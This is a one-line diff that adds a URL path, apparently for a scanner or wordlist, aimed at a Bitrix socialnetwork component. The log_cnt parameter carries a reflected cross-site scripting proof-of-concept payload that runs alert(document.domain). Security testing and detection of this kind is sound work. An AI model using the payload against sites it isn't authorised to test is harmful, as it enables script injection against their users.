@@ -1,0 +1,1 @@
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>
